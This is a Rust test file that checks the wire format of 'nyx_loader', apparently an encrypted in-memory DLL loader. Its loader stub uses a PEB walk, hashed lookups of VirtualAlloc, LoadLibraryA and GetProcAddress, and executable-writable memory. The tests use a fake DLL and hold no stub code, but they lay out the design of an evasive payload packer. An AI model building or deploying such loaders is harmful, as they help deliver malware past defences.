//! Host-side payload-format tests for `wrap_payload` (spec §5.4).
//!
//! `wrap_payload_emits_magic_and_lengths` wraps a small synthetic "DLL" and
//! verifies the output blob's structure field-by-field against the payload
//! layout documented in [`nyx_loader`] (and spec §5.1):
//!
//! ```text
//! [loader stub (Layer 1 + key + Layer 2)][NYX2 magic (4B)]
//! [encrypted_len u32 LE (4B)][nonce (12B)]
//! [ciphertext (N bytes)][Poly1305 tag (16B)]
//! ```
//!
//! These tests do NOT decrypt (that's [`roundtrip_decrypt`]) — they assert
//! the wire format the on-target stub parses. A drift here means the stub's
//! header-offset constants (`ENCRYPTED_LEN_OFFSET`, `NONCE_OFFSET`,
//! `CIPHERTEXT_OFFSET`) silently desync from the host emitter.

use nyx_loader::{
    generate_loader_stub, on_target,
    on_target::{KEY_LEN, KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP, LAYER2_PEB_WALK},
    wrap_payload, LoaderConfig, CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, NYX2_MAGIC,
    TAG_LEN,
};

/// Expected stub length for a given config: Layer 1 + 32-byte key + Layer 2.
fn expected_stub_len() -> usize {
    LAYER1_BOOTSTRAP.len() + KEY_LEN + LAYER2_PEB_WALK.len()
}

/// Build a small but non-trivial fake DLL body. We don't need a valid PE here
/// (the format tests don't decrypt); just bytes that won't accidentally
/// contain the NYX2 magic.
fn fake_dll() -> Vec<u8> {
    let mut dll = Vec::new();
    dll.extend_from_slice(b"MZ");
    dll.extend_from_slice(&[0u8; 62]);
    dll.extend_from_slice(b"PE\0\0");
    dll.extend_from_slice(&[0xAAu8; 200]);
    dll
}

/// `wrap_payload` must emit the stub, then the NYX2 magic, encrypted_len,
/// nonce, ciphertext, and Poly1305 tag in the documented order and widths.
#[test]
fn wrap_payload_emits_magic_and_lengths() {
    let key = [0x11u8; 32];
    let nonce = [0x22u8; 12];
    let config = LoaderConfig::new(key, nonce);
    let dll = fake_dll();
    let payload = wrap_payload(&dll, &config);

    let stub_len = expected_stub_len();
    let magic_off = stub_len;
    let enc_len_off = magic_off + ENCRYPTED_LEN_OFFSET;
    let nonce_off = magic_off + NONCE_OFFSET;
    let ct_off = magic_off + CIPHERTEXT_OFFSET;

    // ── total length ─────────────────────────────────────────────────────
    // stub + 4 (magic) + 4 (enc_len) + 12 (nonce) + dll.len() + 16 (tag)
    let expected_total = stub_len + 4 + 4 + 12 + dll.len() + TAG_LEN;
    assert_eq!(
        payload.len(),
        expected_total,
        "total payload length must match the documented layout"
    );

    // ── stub prefix ──────────────────────────────────────────────────────
    // The stub portion must equal what generate_loader_stub emits for the
    // same config (key baked in). This catches any drift between the emitter
    // and the wrapper.
    assert_eq!(
        &payload[..stub_len],
        &generate_loader_stub(&config),
        "payload must begin with the per-config loader stub"
    );
    // And the key must be visible at KEY_PATCH_OFFSET within the stub.
    assert_eq!(
        &payload[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN],
        &key,
        "32-byte key must be baked into the stub at KEY_PATCH_OFFSET"
    );

    // ── NYX2 magic (4 bytes, little-endian) ──────────────────────────────
    let magic = u32::from_le_bytes(payload[magic_off..magic_off + 4].try_into().unwrap());
    assert_eq!(magic, NYX2_MAGIC, "NYX2 magic must follow the stub");
    // The bytes in memory are 'N' 'Y' 'X' '2'.
    assert_eq!(&payload[magic_off..magic_off + 4], b"NYX2");

    // ── encrypted_len (u32 LE) ───────────────────────────────────────────
    let enc_len = u32::from_le_bytes(payload[enc_len_off..enc_len_off + 4].try_into().unwrap());
    assert_eq!(
        enc_len as usize,
        dll.len(),
        "encrypted_len must equal the plaintext DLL length (ChaCha20 is a stream cipher)"
    );

    // ── nonce (12 bytes) ─────────────────────────────────────────────────
    assert_eq!(
        &payload[nonce_off..nonce_off + 12],
        &nonce,
        "nonce must be placed verbatim after encrypted_len"
    );

    // ── ciphertext || tag ────────────────────────────────────────────────
    // Ciphertext is `dll.len()` bytes; tag is `TAG_LEN` bytes; together they
    // occupy everything from ct_off to the end.
    assert_eq!(
        payload[ct_off..].len(),
        dll.len() + TAG_LEN,
        "trailing bytes must be ciphertext ({}) + tag ({})",
        dll.len(),
        TAG_LEN
    );
}

/// The header field offsets are absolute constants documented in `stub.rs`
/// (`ENCRYPTED_LEN_OFFSET = 4`, `NONCE_OFFSET = 8`, `CIPHERTEXT_OFFSET = 20`).
/// Pin them so a change is caught here rather than as an on-target parse
/// failure.
#[test]
fn header_offsets_match_documented_layout() {
    assert_eq!(ENCRYPTED_LEN_OFFSET, 4);
    assert_eq!(NONCE_OFFSET, 8);
    assert_eq!(CIPHERTEXT_OFFSET, 20);
    assert_eq!(TAG_LEN, 16);
    // magic + enc_len + nonce = 4 + 4 + 12 = 20 = CIPHERTEXT_OFFSET.
    assert_eq!(4 + 4 + 12, CIPHERTEXT_OFFSET);
}

/// An empty DLL produces a valid (if degenerate) payload: encrypted_len == 0,
/// ciphertext portion empty, just the 16-byte tag trailing.
#[test]
fn wrap_payload_handles_empty_dll() {
    let config = LoaderConfig::new([0xABu8; 32], [0xCDu8; 12]);
    let payload = wrap_payload(&[], &config);
    let stub_len = expected_stub_len();
    let magic_off = stub_len;

    assert_eq!(payload.len(), stub_len + 4 + 4 + 12 + TAG_LEN);

    let enc_len = u32::from_le_bytes(payload[magic_off + 4..magic_off + 8].try_into().unwrap());
    assert_eq!(enc_len, 0);

    // Trailing bytes are exactly the tag.
    assert_eq!(payload[magic_off + CIPHERTEXT_OFFSET..].len(), TAG_LEN);
}

/// `on_target` module must publicly expose the constants the layout test
/// relies on. This is a structural assertion: if a constant is renamed/removed
/// the test stops compiling, surfacing the API change at the right call site.
#[test]
fn on_target_constants_are_accessible() {
    // Touch each constant so a rename is a compile error here, not a silent
    // behaviour change on-target.
    let _ = on_target::KEY_PATCH_OFFSET;
    let _ = on_target::KEY_LEN;
    let _ = on_target::MAGIC_SCAN_BOUND;
    let _ = on_target::HASH_KERNEL32_DLL;
    let _ = on_target::HASH_VIRTUAL_ALLOC;
    let _ = on_target::HASH_LOAD_LIBRARY_A;
    let _ = on_target::HASH_GET_PROC_ADDRESS;
    let _ = on_target::MEM_COMMIT_RESERVE;
    let _ = on_target::PAGE_EXECUTE_READWRITE;
    let _ = on_target::DLL_PROCESS_ATTACH;
}
